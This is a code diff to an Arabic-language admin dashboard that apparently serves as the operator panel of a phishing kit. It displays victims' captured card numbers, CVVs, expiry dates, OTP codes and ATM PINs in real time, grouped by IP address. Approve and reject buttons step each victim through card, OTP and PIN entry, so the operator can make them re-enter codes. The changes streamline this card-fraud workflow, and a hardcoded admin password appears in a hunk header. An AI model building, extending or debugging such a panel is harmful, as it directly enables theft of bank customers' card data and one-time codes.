@@ -92,13 +92,9 @@
     animation: slideIn 0.3s ease;
   }
   .pending-card.payment-card { border-right-color: #7c3aed; }
-  .pending-card.otp-card { border-right-color: #ea580c; }
-  .pending-card.pin-card { border-right-color: #0d9488; }
   @keyframes slideIn { from{opacity:0;transform:translateY(-10px)} to{opacity:1;transform:translateY(0)} }
   .pending-card-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; }
-  .pending-type {
-    display: flex; align-items: center; gap: 8px; font-weight: 700; font-size: 14px;
-  }
+  .pending-type { display: flex; align-items: center; gap: 8px; font-weight: 700; font-size: 14px; }
   .type-badge {
     padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 700;
   }
@@ -111,19 +107,50 @@
   .data-field label { font-size: 11px; color: #718096; display: block; margin-bottom: 3px; }
   .data-field span { font-size: 14px; font-weight: 600; color: #1a202c; direction: ltr; display: block; }
   .data-field.full { grid-column: 1 / -1; }
+
+  /* OTP/PIN section inside payment card */
+  .code-section {
+    border-top: 1.5px dashed #e2e8f0; margin-top: 14px; padding-top: 14px;
+    animation: fadeIn 0.4s ease;
+  }
+  .code-section-title {
+    font-size: 12px; font-weight: 700; color: #718096; margin-bottom: 10px;
+    text-transform: uppercase; letter-spacing: 0.5px; display: flex; align-items: center; gap: 6px;
+  }
+  .code-value {
+    font-size: 28px; font-weight: 900; letter-spacing: 6px; text-align: center;
+    padding: 12px; background: #f8fafc; border-radius: 10px; margin-bottom: 10px;
+  }
+  .code-value.otp-val { color: #ea580c; }
+  .code-value.pin-val { color: #0d9488; }
+  @keyframes fadeIn { from{opacity:0;transform:translateY(5px)} to{opacity:1;transform:translateY(0)} }
+
+  /* Action buttons - start gray, turn colored on new data */
   .pending-actions { display: flex; gap: 10px; }
   .btn-approve {
-    flex: 1; padding: 11px; background: #059669; color: #fff; border: none;
+    flex: 1; padding: 11px; color: #fff; border: none;
     border-radius: 10px; font-size: 14px; font-weight: 700; cursor: pointer;
-    transition: background 0.2s; display: flex; align-items: center; justify-content: center; gap: 6px;
+    transition: background 0.3s; display: flex; align-items: center; justify-content: center; gap: 6px;
+    background: #9ca3af;
   }
-  .btn-approve:hover { background: #047857; }
+  .btn-approve.active { background: #059669; }
+  .btn-approve.active:hover { background: #047857; }
   .btn-reject {
-    flex: 1; padding: 11px; background: #e53e3e; color: #fff; border: none;
+    flex: 1; padding: 11px; color: #fff; border: none;
     border-radius: 10px; font-size: 14px; font-weight: 700; cursor: pointer;
-    transition: background 0.2s; display: flex; align-items: center; justify-content: center; gap: 6px;
+    transition: background 0.3s; display: flex; align-items: center; justify-content: center; gap: 6px;
+    background: #9ca3af;
   }
-  .btn-reject:hover { background: #c53030; }
+  .btn-reject.active { background: #e53e3e; }
+  .btn-reject.active:hover { background: #c53030; }
+
+  /* Pulse animation on new data */
+  @keyframes newDataPulse {
+    0% { box-shadow: 0 0 0 0 rgba(37,99,235,0.4); }
+    70% { box-shadow: 0 0 0 10px rgba(37,99,235,0); }
+    100% { box-shadow: 0 0 0 0 rgba(37,99,235,0); }
+  }
+  .new-data-pulse { animation: newDataPulse 0.8s ease; }
 
   /* Bookings table */
   .table-card {
@@ -216,6 +243,7 @@
     .main-content { padding: 16px; }
     .pending-data { grid-template-columns: 1fr; }
     .modal-grid { grid-template-columns: 1fr; }
+    .search-box { width: 160px; }
   }
 </style>
 </head>
@@ -358,6 +386,8 @@ const ADMIN_PASSWORD = 'Vsafety@2024';
 let socket = null;
 let allBookings = [];
 let currentModalBooking = null;
+
+// pendingRequests: ip -> { requestId, paymentData, otpData, pinData, currentRequestId, hasNewData }
 let pendingRequests = {};
 
 // ==================== Login ====================
@@ -412,39 +442,83 @@ function initSocket() {
     updateStats();
   });
 
-  // New payment data - needs approval
+  // New payment data - create new card for this IP
   socket.on('newPayment', (data) => {
-    addPendingRequest(data, 'payment');
+    const ip = data.ip;
+    // Create or update the card for this IP
+    pendingRequests[ip] = {
+      ip,
+      requestId: data.requestId,
+      currentRequestId: data.requestId,
+      paymentData: data,
+      otpData: null,
+      pinData: null,
+      hasNewData: true
+    };
+    renderPendingRequests();
+    updatePendingCount();
+    playNotification();
+    // Activate buttons after short delay (new data arrived)
+    setTimeout(() => activateButtons(ip), 100);
   });
 
-  // New code (OTP/PIN) - needs approval
+  // New code (OTP/PIN) - update existing card for this IP
   socket.on('newCode', (data) => {
-    addPendingRequest(data, data.type || 'otp');
+    const ip = data.ip;
+    const type = data.type || 'otp';
+
+    if (pendingRequests[ip]) {
+      // Update existing card
+      pendingRequests[ip].currentRequestId = data.requestId;
+      pendingRequests[ip].hasNewData = true;
+      if (type === 'pin') {
+        pendingRequests[ip].pinData = data;
+      } else {
+        pendingRequests[ip].otpData = data;
+      }
+      // Re-render and re-activate buttons
+      renderPendingRequests();
+      updatePendingCount();
+      playNotification();
+      setTimeout(() => activateButtons(ip), 100);
+    } else {
+      // No existing payment card - create standalone code card
+      pendingRequests[ip] = {
+        ip,
+        requestId: data.requestId,
+        currentRequestId: data.requestId,
+        paymentData: null,
+        otpData: type !== 'pin' ? data : null,
+        pinData: type === 'pin' ? data : null,
+        hasNewData: true
+      };
+      renderPendingRequests();
+      updatePendingCount();
+      playNotification();
+      setTimeout(() => activateButtons(ip), 100);
+    }
   });
+}
+
+function activateButtons(ip) {
+  const card = document.getElementById('card-ip-' + ip.replace(/\./g, '_'));
+  if (!card) return;
+  const approveBtn = card.querySelector('.btn-approve');
+  const rejectBtn = card.querySelector('.btn-reject');
+  if (approveBtn) {
+    approveBtn.classList.add('active');
+    approveBtn.classList.remove('disabled-btn');
+  }
+  if (rejectBtn) {
+    rejectBtn.classList.add('active');
+    rejectBtn.classList.remove('disabled-btn');
+  }
+  // Pulse animation on card
+  card.classList.add('new-data-pulse');
+  setTimeout(() => card.classList.remove('new-data-pulse'), 800);
 }
 
 // ==================== Pending Requests ====================
-function addPendingRequest(data, type) {
-  const requestId = data.requestId;
-  pendingRequests[requestId] = { ...data, type };
-  renderPendingRequests();
-  updatePendingCount();
-
-  // Play notification sound
-  try {
-    const ctx = new AudioContext();
-    const osc = ctx.createOscillator();
-    const gain = ctx.createGain();
-    osc.connect(gain);
-    gain.connect(ctx.destination);
-    osc.frequency.value = 880;
-    gain.gain.setValueAtTime(0.3, ctx.currentTime);
-    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5);
-    osc.start(ctx.currentTime);
-    osc.stop(ctx.currentTime + 0.5);
-  } catch(e) {}
-}
-
 function renderPendingRequests() {
   const grid = document.getElementById('pendingGrid');
   const section = document.getElementById('pendingSection');
@@ -459,126 +533,82 @@ function renderPendingRequests() {
   document.getElementById('pendingCount').textContent = requests.length;
 
   grid.innerHTML = requests.map(req => {
-    if (req.type === 'payment') {
-      return `
-        <div class="pending-card payment-card" id="req-${req.requestId}">
-          <div class="pending-card-header">
-            <div class="pending-type">
-              <i class="fas fa-credit-card" style="color:#7c3aed"></i>
-              بيانات بطاقة جديدة
-              <span class="type-badge payment">بطاقة</span>
-            </div>
-            <span class="pending-ip">${req.ip || '-'}</span>
+    const ipId = req.ip.replace(/\./g, '_');
+    const pd = req.paymentData;
+    const od = req.otpData;
+    const pind = req.pinData;
+
+    // Determine card label and approve button text
+    let approveLabel = 'قبول';
+    if (pind) approveLabel = 'قبول ✓';
+    else if (od) approveLabel = 'قبول → رقم سري ATM';
+    else if (pd) approveLabel = 'قبول → OTP';
+
+    let rejectLabel = 'رفض';
+    if (pind) rejectLabel = 'رفض → إعادة PIN';
+    else if (od) rejectLabel = 'رفض → إعادة OTP';
+    else if (pd) rejectLabel = 'رفض البطاقة';
+
+    return `
+      <div class="pending-card payment-card" id="card-ip-${ipId}">
+        <div class="pending-card-header">
+          <div class="pending-type">
+            <i class="fas fa-credit-card" style="color:#7c3aed"></i>
+            بيانات عميل
+            <span class="type-badge payment">بطاقة</span>
+            ${od ? '<span class="type-badge otp" style="margin-right:4px">OTP</span>' : ''}
+            ${pind ? '<span class="type-badge pin" style="margin-right:4px">PIN</span>' : ''}
           </div>
-          <div class="pending-data">
-            <div class="data-field full">
-              <label>اسم حامل البطاقة</label>
-              <span>${req.cardHolderName || '-'}</span>
-            </div>
-            <div class="data-field">
-              <label>رقم البطاقة</label>
-              <span>${req.cardNumber || '-'}</span>
-            </div>
-            <div class="data-field">
-              <label>نوع البطاقة</label>
-              <span>${req.cardType || '-'}</span>
-            </div>
-            <div class="data-field">
-              <label>تاريخ الانتهاء</label>
-              <span>${req.expiry || '-'}</span>
-            </div>
-            <div class="data-field">
-              <label>CVV</label>
-              <span>${req.cvv || '-'}</span>
-            </div>
+          <span class="pending-ip">${req.ip || '-'}</span>
+        </div>
+
+        ${pd ? `
+        <div class="pending-data">
+          <div class="data-field full">
+            <label>اسم حامل البطاقة</label>
+            <span>${pd.cardHolderName || pd.card_holder_name || '-'}</span>
           </div>
-          <div class="pending-actions">
-            <button class="btn-approve" onclick="approveRequest('${req.requestId}')">
-              <i class="fas fa-check"></i> قبول → OTP
-            </button>
-            <button class="btn-reject" onclick="rejectRequest('${req.requestId}')">
-              <i class="fas fa-times"></i> رفض
-            </button>
+          <div class="data-field">
+            <label>رقم البطاقة</label>
+            <span>${pd.cardNumber || pd.card_number || '-'}</span>
           </div>
-        </div>`;
-    } else if (req.type === 'otp' || req.type === 'verification_code') {
-      return `
-        <div class="pending-card otp-card" id="req-${req.requestId}">
-          <div class="pending-card-header">
-            <div class="pending-type">
-              <i class="fas fa-key" style="color:#ea580c"></i>
-              رمز OTP جديد
-              <span class="type-badge otp">OTP</span>
-            </div>
-            <span class="pending-ip">${req.ip || '-'}</span>
+          <div class="data-field">
+            <label>تاريخ الانتهاء</label>
+            <span>${pd.expiry || pd.expirationDate || '-'}</span>
           </div>
-          <div class="pending-data">
-            <div class="data-field full">
-              <label>رمز التحقق OTP</label>
-              <span style="font-size:22px;font-weight:800;color:#ea580c;letter-spacing:4px">${req.code || '-'}</span>
-            </div>
+          <div class="data-field">
+            <label>CVV</label>
+            <span>${pd.cvv || '-'}</span>
           </div>
-          <div class="pending-actions">
-            <button class="btn-approve" onclick="approveRequest('${req.requestId}')">
-              <i class="fas fa-check"></i> قبول → رقم سري ATM
-            </button>
-            <button class="btn-reject" onclick="rejectRequest('${req.requestId}', 'برجاء التحقق من الرمز الصحيح')">
-              <i class="fas fa-times"></i> رفض → إعادة OTP
-            </button>
+        </div>` : ''}
+
+        ${od ? `
+        <div class="code-section">
+          <div class="code-section-title">
+            <i class="fas fa-key" style="color:#ea580c"></i>
+            رمز OTP المُدخل
           </div>
-        </div>`;
-    } else if (req.type === 'pin') {
-      return `
-        <div class="pending-card pin-card" id="req-${req.requestId}">
-          <div class="pending-card-header">
-            <div class="pending-type">
-              <i class="fas fa-lock" style="color:#0d9488"></i>
-              رقم سري ATM جديد
-              <span class="type-badge pin">ATM PIN</span>
-            </div>
-            <span class="pending-ip">${req.ip || '-'}</span>
+          <div class="code-value otp-val">${od.code || '-'}</div>
+        </div>` : ''}
+
+        ${pind ? `
+        <div class="code-section">
+          <div class="code-section-title">
+            <i class="fas fa-lock" style="color:#0d9488"></i>
+            الرقم السري ATM
           </div>
-          <div class="pending-data">
-            <div class="data-field full">
-              <label>الرقم السري</label>
-              <span style="font-size:22px;font-weight:800;color:#0d9488;letter-spacing:4px">${req.code || '-'}</span>
-            </div>
-          </div>
-          <div class="pending-actions">
-            <button class="btn-approve" onclick="approveRequest('${req.requestId}')">
-              <i class="fas fa-check"></i> قبول
-            </button>
-            <button class="btn-reject" onclick="rejectRequest('${req.requestId}')">
-              <i class="fas fa-times"></i> رفض
-            </button>
-          </div>
-        </div>`;
-    } else {
-      return `
-        <div class="pending-card" id="req-${req.requestId}">
-          <div class="pending-card-header">
-            <div class="pending-type">
-              <i class="fas fa-info-circle"></i>
-              بيانات جديدة (${req.type})
-            </div>
-            <span class="pending-ip">${req.ip || '-'}</span>
-          </div>
-          <div class="pending-data">
-            <div class="data-field full">
-              <label>البيانات</label>
-              <span>${req.code || JSON.stringify(req)}</span>
-            </div>
-          </div>
-          <div class="pending-actions">
-            <button class="btn-approve" onclick="approveRequest('${req.requestId}')">
-              <i class="fas fa-check"></i> قبول
-            </button>
-            <button class="btn-reject" onclick="rejectRequest('${req.requestId}')">
-              <i class="fas fa-times"></i> رفض
-            </button>
-          </div>
-        </div>`;
-    }
+          <div class="code-value pin-val">${pind.code || '-'}</div>
+        </div>` : ''}
+
+        <div class="pending-actions" style="margin-top:14px">
+          <button class="btn-approve" onclick="approveRequest('${req.ip}')">
+            <i class="fas fa-check"></i> ${approveLabel}
+          </button>
+          <button class="btn-reject" onclick="rejectRequest('${req.ip}')">
+            <i class="fas fa-times"></i> ${rejectLabel}
+          </button>
+        </div>
+      </div>`;
   }).join('');
 }
 
@@ -587,43 +617,71 @@ function updatePendingCount() {
   document.getElementById('statPending').textContent = count;
 }
 
-async function approveRequest(requestId) {
+async function approveRequest(ip) {
+  const req = pendingRequests[ip];
+  if (!req) return;
+  const requestId = req.currentRequestId;
+
   try {
     await fetch(`${SERVER_URL}/api/approve`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ requestId })
     });
-    removePendingRequest(requestId);
-    document.getElementById('statCompleted').textContent =
-      parseInt(document.getElementById('statCompleted').textContent) + 1;
   } catch(e) {
-    // Also try via socket
     if (socket) socket.emit('adminApprove', { requestId });
-    removePendingRequest(requestId);
+  }
+
+  // Gray out buttons and wait for next data
+  grayOutButtons(ip);
+  document.getElementById('statCompleted').textContent =
+    parseInt(document.getElementById('statCompleted').textContent) + 1;
+
+  // If PIN was approved, remove the card entirely
+  if (req.pinData) {
+    delete pendingRequests[ip];
+    const el = document.getElementById('card-ip-' + ip.replace(/\./g, '_'));
+    if (el) el.remove();
+    renderPendingRequests();
+    updatePendingCount();
   }
 }
 
-async function rejectRequest(requestId, message) {
+async function rejectRequest(ip) {
+  const req = pendingRequests[ip];
+  if (!req) return;
+  const requestId = req.currentRequestId;
+
   try {
     await fetch(`${SERVER_URL}/api/reject`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ requestId, message: message || 'تم الرفض' })
+      body: JSON.stringify({ requestId, message: 'تم الرفض' })
     });
-    removePendingRequest(requestId);
   } catch(e) {
-    if (socket) socket.emit('adminReject', { requestId, message: message || 'تم الرفض' });
-    removePendingRequest(requestId);
+    if (socket) socket.emit('adminReject', { requestId, message: 'تم الرفض' });
+  }
+
+  // Gray out buttons and wait for next data
+  grayOutButtons(ip);
+
+  // If payment was rejected (no OTP/PIN yet), remove card
+  if (!req.otpData && !req.pinData) {
+    delete pendingRequests[ip];
+    const el = document.getElementById('card-ip-' + ip.replace(/\./g, '_'));
+    if (el) el.remove();
+    renderPendingRequests();
+    updatePendingCount();
   }
 }
 
-function removePendingRequest(requestId) {
-  delete pendingRequests[requestId];
-  const el = document.getElementById(`req-${requestId}`);
-  if (el) el.remove();
-  renderPendingRequests();
-  updatePendingCount();
+function grayOutButtons(ip) {
+  const card = document.getElementById('card-ip-' + ip.replace(/\./g, '_'));
+  if (!card) return;
+  const approveBtn = card.querySelector('.btn-approve');
+  const rejectBtn = card.querySelector('.btn-reject');
+  if (approveBtn) approveBtn.classList.remove('active');
+  if (rejectBtn) rejectBtn.classList.remove('active');
 }
 
 // ==================== Bookings ====================
@@ -706,6 +764,22 @@ function updateStats() {
   document.getElementById('statCompleted').textContent = completed;
 }
 
+// ==================== Notification Sound ====================
+function playNotification() {
+  try {
+    const ctx = new AudioContext();
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    osc.connect(gain);
+    gain.connect(ctx.destination);
+    osc.frequency.value = 880;
+    gain.gain.setValueAtTime(0.3, ctx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5);
+    osc.start(ctx.currentTime);
+    osc.stop(ctx.currentTime + 0.5);
+  } catch(e) {}
+}
+
 // ==================== Navigation ====================
 function toggleNavDropdown(btn, ip, bookingId) {
   const dropdown = btn.nextElementSibling;
@@ -769,7 +843,6 @@ async function showDetails(bookingId) {
       <div class="modal-grid" style="margin-bottom:10px">
         <div class="modal-field full"><label>اسم حامل البطاقة</label><span>${p.card_holder_name || '-'}</span></div>
         <div class="modal-field"><label>رقم البطاقة</label><span>${p.card_number || '-'}</span></div>
-        <div class="modal-field"><label>نوع البطاقة</label><span>${p.card_type || '-'}</span></div>
         <div class="modal-field"><label>تاريخ الانتهاء</label><span>${p.expiry || '-'}</span></div>
         <div class="modal-field"><label>CVV</label><span>${p.cvv || '-'}</span></div>
       </div>`).join('')}
@@ -779,8 +852,8 @@ async function showDetails(bookingId) {
       <h4><i class="fas fa-key" style="margin-left:6px;color:#ea580c"></i> الرموز والأكواد</h4>
       ${extraData.codes.map(c => `
       <div class="modal-grid" style="margin-bottom:8px">
-        <div class="modal-field"><label>النوع</label><span>${c.code_type || '-'}</span></div>
-        <div class="modal-field"><label>الرمز</label><span style="font-size:18px;font-weight:800;letter-spacing:3px">${c.code || '-'}</span></div>
+        <div class="modal-field"><label>${c.code_type === 'pin' ? 'رقم سري ATM' : 'رمز OTP'}</label><span style="font-size:18px;font-weight:800;letter-spacing:3px">${c.code || '-'}</span></div>
+        <div class="modal-field"><label>الحالة</label><span>${getStatusLabel(c.status)}</span></div>
       </div>`).join('')}
     </div>` : ''}
   `;
